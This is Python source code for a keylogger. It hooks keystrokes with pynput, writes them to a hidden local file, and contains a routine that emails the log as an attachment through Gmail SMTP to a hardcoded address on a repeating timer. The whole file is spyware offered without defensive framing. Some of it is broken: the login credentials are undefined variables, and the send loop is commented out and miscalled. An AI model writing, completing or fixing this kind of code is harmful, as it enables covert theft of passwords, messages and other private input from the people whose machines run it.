import sys,os,logging,smtplib,datetime as dt,threading,time
from pynput import keyboard
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

kfile=os.path.join(os.path.dirname(os.path.abspath(__file__)),'.kfile')

class KeyLogger:
	def __init__(self,interval=60):    # default interval is 60 seconds
			self.interval=interval
			self.mail_from="klogger@gmail.com"
			self.mail_to="klogger@gmail.com"
			self.mail_subject="klogger logs"
			self.mail_body=f"Dear 3AX,\n\nPlease find attached klogger logs for the last {self.interval//60} minutes.\n"
			
	def captureKey(self,key):
		try:
			ckey=str(key).replace("'","")
		except AttributeError as e:
			ckey=e

		logging.basicConfig(filename=(kfile),level=logging.DEBUG,format='%(asctime)s \t %(message)s')
		logging.info(ckey)

	def logfile(self):
		if not os.path.exists(kfile):
			with open(kfile, 'w+'): pass    # create a new file if not exists

	def createmessage(self,message,logfile):
		msg=MIMEMultipart()
		msg["from"]=self.mail_from
		msg["to"]=self.mail_to
		msg["subject"]=self.mail_subject
		msg_text=MIMEText(message,"plain")
		html_from_text=f"<p>{message}</p>"
		msg_html=MIMEText(html_from_text,"html")
		msg.attach(msg_text)
		msg.attach(msg_html)
		attached_file=open(logfile,"rb")
		msg_attachment=MIMEBase("application","octet-stream")
		msg_attachment.set_payload((attached_file).read())
		encoders.encode_base64(msg_attachment)
		msg_attachment.add_header("Content-Disposition","attachment; filename = %s" % logfile) 
		msg.attach(msg_attachment)
		
		return msg.as_string()

	def sendmessage(self):
		print(self.createmessage(self.mail_body,kfile))
		try:
			server=smtplib.SMTP("smtp.gmail.com",587)
			server.starttls()
			server.login(email,password)
			server.sendmail(self.mail_from, self.mail_to, self.createmessage(self.mail_body,kfile))
			server.quit()
			print("[+] keylogger logs sent successfully")
		except Exception as e:
			print("Encountered exception: {}".format(e))
			print("[+] failed sending keylogger logs")
		
	def queuemessage(self):
		self.sendmessage()
		timer=threading.Timer(self.interval,self.queuemessage())
		timer.start()
		with open(kfile, 'w+'): pass     # truncate content of log file after sending mail

	def launch(self):
		listener=keyboard.Listener(on_press=self.captureKey)
		with listener:
			#self.queuemessage()
			listener.join()

def klog():
	kl=KeyLogger()
	kl.logfile()
	kl.launch()

if __name__=='__main__':
	try:
		klog()
	except KeyboardInterrupt:
		print("\nCtrl-C detected ... klogger exiting")
	except Exception as e:
		print("Unknown exception occurred: {}".format(e))
		sys.exit(1)
	sys.exit(0)
